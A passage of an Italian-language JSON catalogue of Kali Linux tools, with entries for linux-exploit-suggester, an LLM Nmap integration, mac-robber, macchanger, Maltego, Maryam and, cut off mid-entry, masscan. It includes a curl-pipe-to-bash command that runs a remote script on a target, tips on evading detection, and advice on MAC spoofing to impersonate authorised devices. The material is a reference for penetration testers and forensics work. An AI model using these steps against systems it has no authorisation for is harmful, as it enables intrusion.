sistema.</p><pre><code># === ESECUZIONE SUL TARGET ===\n# Download ed esecuzione diretta (se curl disponibile)\ncurl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash\n\n# Oppure copia lo script e esegui\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n\n# === SPECIFICARE VERSIONE KERNEL ===\n# Utile per analisi offline o quando non si può eseguire lo script\n./linux-exploit-suggester.sh -k 4.15.0-20-generic\n./linux-exploit-suggester.sh --kernel 5.4.0-42-generic\n\n# === FILTRAGGIO OUTPUT ===\n# Solo exploit ad alta probabilità\n./linux-exploit-suggester.sh | grep -A5 \"Highly Probable\"\n\n# Solo vulnerabilità specifiche\n./linux-exploit-suggester.sh | grep -i \"dirty\"\n\n# === OUTPUT STRUTTURATO ===\n# Formato CSV per analisi\n./linux-exploit-suggester.sh --csv > kernel_vulns.csv\n\n# === ANALISI COMPLETA ===\n# Con tutte le informazioni di sistema\n./linux-exploit-suggester.sh -f  # full output\n./linux-exploit-suggester.sh --checksec  # include security features check</code></pre><p>L'output evidenzia gli exploit più probabili in cima alla lista, permettendo di prioritizzare i tentativi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong> dopo aver ottenuto una shell a basso privilegio, Linux Exploit Suggester identifica rapidamente i vettori di escalation più promettenti. Invece di testare manualmente ogni exploit kernel noto, lo script filtra quelli applicabili alla versione specifica.</p><p>Durante <strong>CTF Competitions</strong>, dove il tempo è critico, fornisce un quick-win immediato: eseguire lo script, identificare l'exploit più probabile, scaricarlo, compilarlo ed eseguirlo può portare a root in pochi minuti su macchine vulnerabili.</p><p>Per <strong>Security Auditing</strong>, permette di verificare lo stato di patching dei kernel sui sistemi aziendali. L'output CSV può essere aggregato per identificare sistemi critici che richiedono aggiornamenti urgenti.</p><p>In <strong>Vulnerability Assessment</strong>, aiuta a documentare l'esposizione a vulnerabilità kernel note, fornendo CVE specifici e CVSS scores per i report di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Footprint Minimo:</strong> Lo script è puramente informativo - legge solo informazioni di sistema senza eseguire exploit o modificare nulla. Può essere eseguito da memoria con curl|bash senza lasciare file su disco.</p><p><strong>Rilevamento:</strong> L'esecuzione dello script può essere rilevata da EDR che monitorano l'accesso a /proc/version, uname syscalls, o pattern di comandi associati a reconnaissance. In ambienti hardened, preferire analisi offline.</p><p><strong>Compilazione Exploit:</strong> Gli exploit suggeriti spesso richiedono compilazione. GCC potrebbe non essere presente sul target. In questi casi, compilare sulla macchina attaccante per l'architettura target (cross-compile se necessario) e trasferire il binario.</p><p><strong>Stabilità Sistema:</strong> Alcuni exploit kernel possono causare kernel panic se falliscono. Valutare sempre l'impatto prima di eseguire exploit, specialmente su sistemi di produzione durante engagement autorizzati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "llm-tools-nmap",
    "name": "llm-tools-nmap",
    "version": "0.0~git20250612.36818ca",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/llm-tools-nmap/",
    "desc": "Integrazione Nmap per LLM che permette a AI di eseguire e interpretare scan di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LLM-Tools-Nmap</strong> è un pacchetto di integrazione che permette a Large Language Models (come Claude, GPT, o modelli open-source) di eseguire scan Nmap e interpretarne i risultati in modo autonomo. Implementa un'interfaccia tool/function-calling che traduce richieste in linguaggio naturale in comandi Nmap appropriati, esegue gli scan, e restituisce risultati strutturati che l'AI può analizzare e commentare. Questo abilita workflow di penetration testing assistiti da AI dove l'operatore può chiedere in linguaggio naturale di scansionare target e ricevere analisi immediate dei risultati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Natural Language Interface:</strong> L'AI interpreta richieste come \"scan for web servers on this subnet\" o \"check what services are running on this IP\" e le traduce automaticamente nei parametri Nmap appropriati, scegliendo tecniche di scan, porte, e opzioni di detection ottimali per l'obiettivo.</p><p><strong>Structured Result Parsing:</strong> L'output XML di Nmap viene processato e convertito in formato strutturato (JSON) che l'AI può analizzare efficacemente. Ogni host, porta, servizio, e versione è organizzato in modo che l'AI possa formulare insight e suggerimenti.</p><p><strong>Contextual Recommendations:</strong> Basandosi sui servizi scoperti, l'AI può suggerire azioni successive: vulnerability scan specifici, exploit potenziali, o ulteriori enumerazioni. Ad esempio, trovando SSH può suggerire bruteforce, trovando SMB può suggerire enum4linux.</p><p><strong>Scan Orchestration:</strong> Permette di concatenare scan multipli in sequenza logica: discovery iniziale, seguito da port scan dettagliato, poi service detection, tutto coordinato dall'AI in base ai risultati intermedi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'integrazione viene configurata come tool MCP (Model Context Protocol) o function per l'LLM utilizzato.</p><pre><code># === CONFIGURAZIONE MCP ===\n# In claude_desktop_config.json o configurazione MCP\n{\n  \"mcpServers\": {\n    \"nmap\": {\n      \"command\": \"llm-tools-nmap\",\n      \"args\": [\"--allow-networks\", \"192.168.0.0/16,10.0.0.0/8\"]\n    }\n  }\n}\n\n# === ESEMPI DI RICHIESTE ALL'AI ===\n# L'utente può chiedere in linguaggio naturale:\n\n\"Scan 192.168.1.1 for open ports\"\n# -> Tradotto in: nmap -sS -T4 192.168.1.1\n\n\"Do a full service detection on 10.10.10.5\"\n# -> Tradotto in: nmap -sV -sC -p- 10.10.10.5\n\n\"Check for web services on the 10.10.10.0/24 network\"\n# -> Tradotto in: nmap -p80,443,8080,8443 10.10.10.0/24\n\n\"Run a stealthy scan on 192.168.1.100\"\n# -> Tradotto in: nmap -sS -T2 --max-retries 2 192.168.1.100\n\n# === L'AI RISPONDE CON ===\n# - Elenco host attivi\n# - Porte aperte e servizi identificati\n# - Versioni software rilevate\n# - Potenziali vulnerabilità note\n# - Suggerimenti per azioni successive</code></pre><p>L'AI gestisce la complessità di Nmap, permettendo anche a utenti non esperti di condurre scan efficaci.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AI-Assisted Penetration Testing</strong>, un operatore può condurre reconnaissance completa conversando con l'AI. \"Scan this IP, what do you find? Now check if SMB is vulnerable.\" L'AI esegue i comandi appropriati e analizza risultati, accelerando significativamente la fase di discovery.</p><p>Nel <strong>Security Training</strong>, studenti possono imparare Nmap attraverso l'AI: chiedendo di spiegare perché ha scelto certi parametri, cosa significano i risultati, e quali sono le implicazioni di sicurezza di servizi esposti.</p><p>Per <strong>Automated Security Auditing</strong>, l'AI può seguire metodologie strutturate: \"Perform a comprehensive scan following PTES methodology on these targets\" e documentare automaticamente i finding.</p><p>In <strong>SOC Operations</strong>, analisti possono richiedere quick-check su IP sospetti: \"Scan this IP that appeared in our logs, is it a known scanner?\" ricevendo analisi immediate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Visibility:</strong> Gli scan Nmap generati sono identici a quelli manuali in termini di network footprint. IDS, firewall, e sistemi di monitoring vedranno normale traffico Nmap. Non c'è offuscamento aggiuntivo.</p><p><strong>AI Judgment:</strong> L'AI potrebbe suggerire scan aggressivi che l'operatore non intendeva. Sempre verificare i comandi proposti prima dell'esecuzione, specialmente in ambienti di produzione. Configurare whitelist di network per prevenire scan accidentali su target non autorizzati.</p><p><strong>Logging:</strong> Le richieste all'AI e i risultati potrebbero essere loggati dal provider LLM. Per engagement sensibili, usare modelli locali o verificare le policy di data retention del provider.</p><p><strong>Privilege:</strong> Molti scan Nmap richiedono privilegi root. Assicurarsi che il tool sia configurato con i permessi appropriati e in ambiente controllato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "mac-robber",
    "name": "mac-robber",
    "version": "1.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mac-robber/",
    "desc": "Estrae timestamp MAC (Modified, Accessed, Changed) da filesystem per timeline forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mac-robber</strong> è uno strumento forense che estrae timestamp MAC (Modified, Accessed, Changed/Created) da tutti i file e directory di un filesystem. L'output è generato nel formato 'body file' di The Sleuth Kit, permettendo l'integrazione diretta con mactime per la creazione di timeline forensi dettagliate. Questo processo è fondamentale nell'analisi forense digitale per ricostruire cronologicamente le attività su un sistema: quando file sono stati creati, modificati, acceduti, permettendo di tracciare azioni di utenti o malware in ordine temporale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete MAC Time Extraction:</strong> Estrae tutti e quattro i timestamp rilevanti: Modified (ultima modifica contenuto), Accessed (ultimo accesso), Changed (ultima modifica metadati su Unix), e Birth/Created (creazione originale dove supportato). Questo fornisce una visione completa dell'attività su ogni file.</p><p><strong>Recursive Directory Traversal:</strong> Analizza ricorsivamente intere strutture di directory, includendo subdirectory, link simbolici (con gestione dei loop), e file nascosti. Può processare filesystem completi in minuti.</p><p><strong>Body File Format:</strong> L'output segue il formato standardizzato body file di The Sleuth Kit: MD5|path|inode|mode|UID|GID|size|atime|mtime|ctime|crtime. Questo formato è universalmente riconosciuto dai tool forensi.</p><p><strong>Filesystem Agnostic:</strong> Funziona su qualsiasi filesystem montato: ext2/3/4, NTFS, FAT, HFS+, XFS, e altri. I timestamp sono estratti attraverso le chiamate di sistema standard, quindi funziona ovunque il filesystem sia montato correttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mac-robber è tipicamente usato insieme a mactime per generare timeline leggibili.</p><pre><code># === ESTRAZIONE BASE ===\n# Estrai MAC times da directory\nmac-robber /home/suspect > body.txt\n\n# Da filesystem root completo\nmac-robber / > full_body.txt\n\n# === CREAZIONE TIMELINE ===\n# Genera timeline ordinata cronologicamente\nmactime -b body.txt > timeline.txt\n\n# Timeline in formato dettagliato\nmactime -b body.txt -d > timeline_detailed.csv\n\n# === FILTRI TEMPORALI ===\n# Solo eventi in un range specifico\nmactime -b body.txt 2024-01-01..2024-01-31 > january_timeline.txt\n\n# Ultimi 7 giorni\nmactime -b body.txt -y > recent_timeline.txt\n\n# === ANALISI IMMAGINE DISCO ===\n# Monta immagine in read-only\nsudo mount -o ro,loop,noatime evidence.dd /mnt/evidence\n\n# Estrai timeline\nmac-robber /mnt/evidence > evidence_body.txt\nmactime -b evidence_body.txt > evidence_timeline.txt\n\n# Smonta preservando l'evidence\nsudo umount /mnt/evidence\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Combina con fls per file cancellati\nfls -r -m / image.dd > fls_body.txt\ncat body.txt fls_body.txt > combined_body.txt\nmactime -b combined_body.txt > full_timeline.txt</code></pre><p>La timeline risultante mostra ogni evento (MACB) ordinato cronologicamente con path completo del file.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, la timeline MAC è fondamentale per ricostruire la sequenza di eventi su un sistema compromesso. Permette di identificare quando un attaccante ha acceduto al sistema, quali file ha creato o modificato, e in quale ordine ha eseguito le sue azioni.</p><p>Durante <strong>Incident Response</strong>, una timeline rapida aiuta a determinare l'ambito della compromissione: quando è iniziata, quali sistemi sono stati toccati, e quali dati potrebbero essere stati esfiltrati. Questo guida le decisioni di contenimento.</p><p>Per <strong>Malware Analysis</strong>, i timestamp rivelano quando il malware è stato scaricato, installato, e quali file ha creato o modificato durante l'esecuzione. Questo aiuta a identificare meccanismi di persistenza e lateral movement.</p><p>In <strong>Legal Investigations</strong>, le timeline forensi sono evidence documentabile che può essere presentata in procedimenti legali, mostrando quando specifiche azioni sono state compiute su un sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Non-Invasive:</strong> Mac-robber è uno strumento puramente read-only. Usa chiamate stat() che non modificano i timestamp di accesso se il filesystem è montato con noatime o in read-only mode.</p><p><strong>Evidence Preservation:</strong> SEMPRE montare immagini forensi e filesystem evidence in read-only mode (mount -o ro,noatime) per prevenire qualsiasi modifica accidentale che invaliderebbe l'evidence.</p><p><strong>Timestamp Reliability:</strong> I timestamp possono essere manipolati da attaccanti sofisticati (timestomping). Correlare sempre con altre fonti: log di sistema, log di rete, journal del filesystem se disponibile.</p><p><strong>Time Zone:</strong> I timestamp sono in UTC o local time a seconda della configurazione del sistema. Documentare sempre il timezone usato per evitare confusione nell'analisi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "macchanger",
    "name": "macchanger",
    "version": "1.7.0",
    "icon": "../app/icons/macchanger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/macchanger/",
    "desc": "Modifica MAC address di interfacce di rete per anonimato e bypass filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Macchanger</strong> è un utility GNU/Linux per modificare (spoofing) il MAC address delle interfacce di rete. Il MAC address è l'identificatore hardware univoco assegnato dal produttore a ogni scheda di rete. Macchanger permette di cambiarlo temporaneamente per vari scopi: anonimato su reti WiFi pubbliche, bypass di filtri MAC-based, impersonazione di dispositivi autorizzati, o testing di controlli di sicurezza. Include un database di OUI (Organizationally Unique Identifier) per generare MAC credibili che corrispondono a vendor specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Random MAC Generation:</strong> Genera un MAC address completamente casuale. I primi 3 byte (OUI) possono essere casuali o selezionati da vendor noti per apparire come un dispositivo legittimo invece che un address palesemente spoofed.</p><p><strong>Vendor-Specific Spoofing:</strong> Utilizza il database interno di OUI per generare MAC che corrispondono a specifici produttori. Può imitare dispositivi Apple, HP, Cisco, o qualsiasi vendor. Utile per apparire come un tipo specifico di device sulla rete.</p><p><strong>Custom MAC Setting:</strong> Permette di impostare un MAC address specifico. Essenziale per impersonare un dispositivo autorizzato di cui si conosce il MAC, o per replicare la configurazione di un altro sistema.</p><p><strong>Persistent Original Storage:</strong> Memorizza il MAC originale dell'interfaccia, permettendo di ripristinarlo facilmente. Questo è utile per tornare alla configurazione originale senza dover cercare il MAC hardware reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia deve essere disattivata prima di modificare il MAC.</p><pre><code># === WORKFLOW COMPLETO ===\n# 1. Disattiva l'interfaccia\nsudo ip link set eth0 down\n\n# 2. Cambia MAC\nsudo macchanger -r eth0  # random\n\n# 3. Riattiva l'interfaccia\nsudo ip link set eth0 up\n\n# === TIPI DI SPOOFING ===\n# MAC completamente random\nsudo macchanger -r eth0\n\n# MAC random ma con OUI di vendor reale (più credibile)\nsudo macchanger -a eth0\n\n# MAC random dello stesso vendor originale\nsudo macchanger -e eth0\n\n# MAC specifico\nsudo macchanger -m 00:11:22:33:44:55 eth0\n\n# === VENDOR-SPECIFIC ===\n# Lista vendor disponibili\nmacchanger -l | grep -i \"apple\"\nmacchanger -l | grep -i \"cisco\"\n\n# === INFO E RESTORE ===\n# Mostra MAC corrente e originale\nmacchanger -s eth0\n\n# Ripristina MAC originale\nsudo macchanger -p eth0\n\n# === AUTOMAZIONE ===\n# Script per cambio automatico al boot\n# In /etc/network/if-pre-up.d/macchanger\n#!/bin/bash\nmacchanger -r $IFACE</code></pre><p>Il cambio MAC è temporaneo e persiste solo fino al reboot o al ripristino esplicito.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privacy su WiFi Pubblici</strong>, cambiare MAC prima di connettersi a reti pubbliche (aeroporti, hotel, caffè) impedisce il tracking basato su MAC address. I sistemi di analytics WiFi usano spesso i MAC per tracciare i movimenti degli utenti.</p><p>Nel <strong>Bypass di Filtri MAC</strong>, alcune reti usano whitelist di MAC address per controllare l'accesso. Se si conosce il MAC di un dispositivo autorizzato (tramite sniffing), si può impersonarlo per ottenere accesso.</p><p>Per <strong>NAC/802.1X Testing</strong>, permette di testare l'efficacia dei controlli di accesso alla rete. Se la sicurezza si basa solo su MAC filtering senza autenticazione forte (802.1X con certificati), il bypass è triviale.</p><p>Durante <strong>Red Team Operations</strong>, apparire come un dispositivo diverso può aiutare l'evasione: un laptop attaccante può apparire come una stampante HP o un telefono IP Cisco per evitare sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Solo Layer 2:</strong> Lo spoofing MAC è efficace solo sulla rete locale. Una volta che il traffico passa attraverso un router, il MAC originale non è più visibile. Per anonimato internet, serve anche VPN o Tor.</p><p><strong>Switch Logging:</strong> Switch managed possono loggare i MAC address visti su ogni porta. Un cambio MAC improvviso o MAC duplicati possono generare alert in ambienti monitorati.</p><p><strong>DHCP Fingerprinting:</strong> I server DHCP possono fingerprint i client basandosi su opzioni richieste, non solo MAC. Cambiare MAC senza modificare il comportamento DHCP può essere rilevato come anomalo.</p><p><strong>802.1X Limitation:</strong> MAC spoofing non bypassa 802.1X con autenticazione EAP-TLS (certificati) o PEAP. Questi sistemi richiedono credenziali valide indipendentemente dal MAC.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "maltego",
    "name": "maltego",
    "version": "4.10.1",
    "icon": "../app/icons/maltego-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maltego/",
    "desc": "Piattaforma OSINT con graph visualization per mappare relazioni tra entità e target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Maltego</strong> e la piattaforma leader mondiale per l'Open Source Intelligence (OSINT) e la link analysis, sviluppata da Paterva (ora parte di Maltego Technologies). Il suo punto di forza risiede nella capacita di visualizzare relazioni complesse tra entita eterogenee - persone, aziende, domini, indirizzi IP, account social media, numeri di telefono, indirizzi email - attraverso grafi interattivi che rendono immediatamente evidenti connessioni altrimenti difficili da individuare. Al centro della piattaforma ci sono i Transform, moduli automatizzati che interrogano centinaia di fonti dati diverse (WHOIS, DNS, Shodan, VirusTotal, social media, database pubblici) per espandere le entita nel grafo con nuove informazioni e relazioni. Maltego e utilizzato da forze dell'ordine, agenzie di intelligence, team di sicurezza aziendale e ricercatori per investigazioni che spaziano dalla threat intelligence al tracciamento di attivita criminali, dalla due diligence aziendale alla mappatura di infrastrutture di attacco.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Graph Visualization e Link Analysis:</strong> Il motore di visualizzazione di Maltego rappresenta le relazioni tra entita come grafi navigabili con layout automatici che evidenziano cluster, hub centrali e pattern di connessione. L'interfaccia permette di esplorare interattivamente le relazioni, filtrare per tipo di entita, applicare pesi ai link e utilizzare diversi algoritmi di layout (gerarchico, circolare, organico) per ottimizzare la leggibilita. La capacita di gestire grafi con migliaia di nodi e decine di migliaia di link rende Maltego adatto a investigazioni complesse che coinvolgono vaste reti di entita interconnesse.</p><p><strong>Transform Hub e Data Sources:</strong> Il Transform Hub di Maltego offre accesso a oltre 400 data source integrati, organizzati in categorie che coprono DNS e infrastruttura, social media, dark web, breach database, threat intelligence, registri aziendali e molto altro. Ogni Transform prende un'entita in input e produce una o piu entita correlate in output, automatizzando completamente la raccolta dati. Transform personalizzati possono essere sviluppati in Python tramite la libreria maltego-trx, permettendo l'integrazione con fonti dati proprietarie o API personalizzate.</p><p><strong>Collaborazione e Reporting:</strong> Le versioni commerciali di Maltego includono funzionalita di collaborazione che permettono a piu analisti di lavorare simultaneamente sullo stesso grafo, condividendo scoperte e annotazioni in tempo reale. Il sistema di case management integrato permette di organizzare le investigazioni, mentre le funzionalita di reporting generano documentazione automatica con screenshot del grafo, timeline degli eventi e liste delle entita scoperte, facilitando la comunicazione dei risultati a stakeholder non tecnici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Maltego opera tramite interfaccia grafica desktop Java-based. La versione Community Edition (CE) inclusa in Kali Linux offre funzionalita limitate ma sufficienti per investigazioni di base.</p><pre><code># Avvio di Maltego da terminale\nmaltego\n\n# Workflow tipico di investigazione:\n# 1. File -> New Graph per creare un nuovo grafo\n# 2. Trascinare un'entita dalla palette (Domain, Person, Email)\n# 3. Inserire il valore dell'entita target\n# 4. Right-click sull'entita -> Run Transform\n# 5. Selezionare la categoria di Transform desiderata:\n#    - DNS: risoluzione, record MX, NS, SOA\n#    - WHOIS: registrante, date, nameserver\n#    - Shodan: porte aperte, servizi, banner\n#    - Social: profili associati, menzioni\n# 6. Analizzare le nuove entita nel grafo\n# 7. Espandere iterativamente con ulteriori Transform\n# 8. Applicare layout e filtri per evidenziare pattern</code></pre><p>Per utilizzare Transform premium e necessario registrare un account sul Transform Hub e configurare le API key dei servizi desiderati. La versione CE ha un limite di 12 entita per Transform result, mentre le versioni commerciali non hanno limiti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>investigazioni OSINT su persone e organizzazioni</strong>, Maltego permette di mappare l'intera impronta digitale di un soggetto partendo da un singolo dato iniziale come un indirizzo email o un nome. Attraverso l'espansione iterativa dei Transform, e possibile scoprire account social media collegati, domini registrati, aziende associate, co-autori di documenti e molto altro, costruendo un profilo completo che rivela connessioni non evidenti da una ricerca manuale.</p><p>Nel campo della <strong>Threat Intelligence e analisi delle minacce</strong>, Maltego e utilizzato per mappare infrastrutture di attacco, correlando domini malevoli, indirizzi IP di command and control, hash di malware e indicatori di compromissione per identificare pattern ricorrenti e attribuire campagne a specifici threat actor. La visualizzazione a grafo rende immediatamente visibili le connessioni tra campagne apparentemente distinte.</p><p>Per la <strong>Due Diligence e Fraud Investigation</strong>, le capacita di link analysis permettono di tracciare relazioni societarie complesse, identificare beneficial owner nascosti, scoprire conflitti di interesse e mappare reti di frode finanziaria analizzando connessioni tra persone, aziende, conti bancari e transazioni attraverso registri pubblici e database commerciali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il livello di rilevabilita dipende interamente dai Transform utilizzati. Transform passivi come WHOIS cached, DNS passivo e ricerche su database pubblici non generano traffico verso il target e non sono rilevabili. Transform attivi come port scanning via Shodan o DNS resolution diretta effettuano connessioni che possono essere loggate. Alcuni data provider registrano le query effettuate tramite le loro API, creando potenzialmente una traccia delle investigazioni condotte.</p><p><strong>Impatto operativo:</strong> La versione Community Edition ha limitazioni significative nel numero di risultati per Transform e nella disponibilita di data source, riducendo l'efficacia per investigazioni complesse. Le versioni commerciali richiedono licenze costose e API key per i servizi premium. L'utilizzo di Transform su social media puo violare i termini di servizio delle piattaforme. I grafi complessi con migliaia di nodi richiedono risorse hardware significative per la visualizzazione fluida.</p><p><strong>Mitigazioni:</strong> Classificare preventivamente i Transform tra passivi e attivi per controllare l'interazione con il target. Utilizzare API key dedicate e separate dall'identita personale per i servizi di data enrichment. Salvare regolarmente il grafo per evitare perdite di lavoro. Documentare ogni Transform eseguito e la sua fonte dati per garantire la tracciabilita e la riproducibilita dell'investigazione nel report finale.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Frameworks"
    ],
    "notes": null
  },
  {
    "id": "maryam",
    "name": "maryam",
    "version": "2.5.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maryam/",
    "desc": "Framework OSINT modulare con 50+ moduli per recon: DNS, email, social, metadata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Maryam</strong> è un framework OSINT modulare open-source scritto in Python, progettato per automatizzare e organizzare le attività di raccolta informazioni. Con oltre 50 moduli indipendenti, copre DNS enumeration, email harvesting, social media reconnaissance, metadata extraction, credential leak search, e molto altro. L'interfaccia CLI interattiva, ispirata a Metasploit, permette di gestire sessioni, configurare target, eseguire moduli e generare report in modo strutturato ed efficiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Architettura Modulare:</strong> Ogni modulo è indipendente e focalizzato su una specifica fonte o tecnica OSINT. I moduli sono organizzati in categorie (osint, footprint, search) e possono essere combinati in workflow personalizzati. Nuovi moduli possono essere aggiunti facilmente.</p><p><strong>Multi-Source Intelligence:</strong> Interroga simultaneamente decine di fonti: motori di ricerca (Google, Bing, DuckDuckGo), database di leak (HaveIBeenPwned), social network (LinkedIn, Twitter), archivi web (Wayback Machine), e servizi DNS (SecurityTrails, VirusTotal).</p><p><strong>Session Management:</strong> Mantiene lo stato tra le esecuzioni, permettendo di riprendere ricerche interrotte, aggregare risultati da moduli diversi, e costruire profili completi di target nel tempo.</p><p><strong>Flexible Reporting:</strong> Esporta i risultati in JSON, XML, CSV, e HTML. I report HTML includono visualizzazioni grafiche delle relazioni tra le entità scoperte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Maryam offre una shell interattiva con comandi simili a Metasploit.</p><pre><code># Avvia la shell Maryam\nmaryam\n\n# Mostra tutti i moduli disponibili\nshow modules\n\n# Cerca moduli per keyword\nsearch dns\n\n# Usa un modulo per DNS enumeration\nuse osint/dns_search\nset DOMAIN target.com\nrun\n\n# Harvesting email\nuse osint/email_search\nset DOMAIN target.com\nset LIMIT 100\nrun\n\n# Social media reconnaissance\nuse osint/social_nets\nset QUERY \"John Doe\"\nrun\n\n# Genera report HTML\nreport html output.html\n\n# Esegui moduli in batch\nmaryam -e \"use osint/dns_search; set DOMAIN target.com; run\"</code></pre><p>I risultati di ogni modulo vengono salvati nella sessione corrente e possono essere esportati o usati come input per altri moduli.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT Investigation</strong>, Maryam fornisce un framework organizzato per condurre ricerche su persone, organizzazioni, o infrastrutture, aggregando dati da fonti multiple in un unico ambiente.</p><p>Durante la fase di <strong>Reconnaissance</strong> in penetration testing, automatizza l'enumeration di subdomain, email, tecnologie web, e altri asset che possono diventare vettori di attacco.</p><p>Per <strong>Threat Intelligence</strong>, permette di monitorare leak di credenziali, presenza di dati aziendali su paste site, e attività sui social media correlate a minacce.</p><p>In contesti di <strong>Due Diligence e Background Check</strong>, aiuta a costruire profili informativi su soggetti di interesse aggregando informazioni pubblicamente disponibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il profilo di rischio varia per modulo. Moduli che usano API di motori di ricerca sono passivi. Moduli che eseguono DNS query attive o interagiscono direttamente con i target possono lasciare tracce.</p><p><strong>Rate Limiting:</strong> Molte fonti (Google, LinkedIn, HaveIBeenPwned) implementano rate limiting. Ricerche aggressive possono causare blocchi temporanei o permanenti degli IP. Usare delay e proxy rotation.</p><p><strong>API Keys:</strong> Alcuni moduli richiedono API key per funzionalità complete (Shodan, VirusTotal, SecurityTrails). Configurare le chiavi nel file di configurazione per risultati ottimali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Frameworks"
    ],
    "notes": null
  },
  {
    "id": "masscan",
    "name": "masscan",
    "version": "1.3.2",
    "icon": "../app/icons/masscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/masscan/",
    "desc": "Port scanner più veloce al mondo, scansiona l'intero internet in pochi minuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Masscan</strong>, sviluppato da Robert David Graham, e universalmente riconosciuto come il port scanner piu veloce al mondo, capace di scansionare l'intero spazio di indirizzi IPv4 (circa 4.3 miliardi di indirizzi) in meno di 6 minuti su una singola macchina con connessione a 10 Gbps. Questa velocita estrema e resa possibile da un'architettura radicalmente diversa dai port scanner tradizionali: Masscan implementa il proprio stack TCP/IP in user-space, bypassando completamente lo stack di rete del sistema operativo, e utilizza trasmissione asincrona dove i pacchetti vengono inviati indipendentemente dalla ricezione delle risposte. L'output e progettato per essere compatibile con il formato di Nmap, facilitando l'integrazione con tool e workflow esistenti. Nonostante la sua velocita, Masscan sacrifica funzionalita avanzate come il service detection e gli script NSE di Nmap, posizionandosi come strumento complementare per la fase iniziale di discovery su range di rete molto ampi, i cui risultati vengono poi approfonditi con scanner piu dettagliati.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Stack TCP/IP Custom e Trasmissione Asincrona:</strong> Il cuore di Masscan e il suo stack di rete personalizzato che opera in user-space, utilizzando raw socket per inviare e ricevere pacchetti direttamente senza passare attraverso il kernel del sistema operativo. I pacchetti SYN vengono generati e inviati a velocita costante indipendentemente dalle risposte ricevute, e un meccanismo di tracking basato su cookie crittografici nel sequence number TCP permette di correlare le risposte SYN-ACK senza mantenere stato per ciascuna connessione. Questo approccio elimina il bottleneck della gestione delle connessioni TCP e permette di raggiungere rate di trasmissione di oltre 10 milioni di pacchetti al secondo.</p><p><strong>Scalabilita e Gestione di Range Enormi:</strong> Masscan e progettato specificamente per scansionare range di indirizzi IP molto ampi, fino all'intero internet. Il sistema di randomizzazione degli indirizzi distribuisce uniformemente i pacchetti attraverso il range di destinazione, evitando di concentrare il traffico su singoli sottoreti e riducendo il rischio di attivare sistemi di protezione. Il flag --exclude permette di escludere range sensibili, e la possibilita di specificare seed per la randomizzazione garantisce la riproducibilita delle scansioni.</p><p><strong>Output Compatibile con Nmap e Banner Grabbing Base:</strong> Masscan supporta i principali formati di output di Nmap (-oX per XML, -oG per grepable, -oJ per JSON), permettendo l'importazione diretta dei risultati in tool come Metasploit, Nessus e framework personalizzati. Una funzionalita di banner grabbing base permette di catturare le risposte iniziali dei servizi su porte specifiche (HTTP, SSH, SSL), fornendo un primo livello 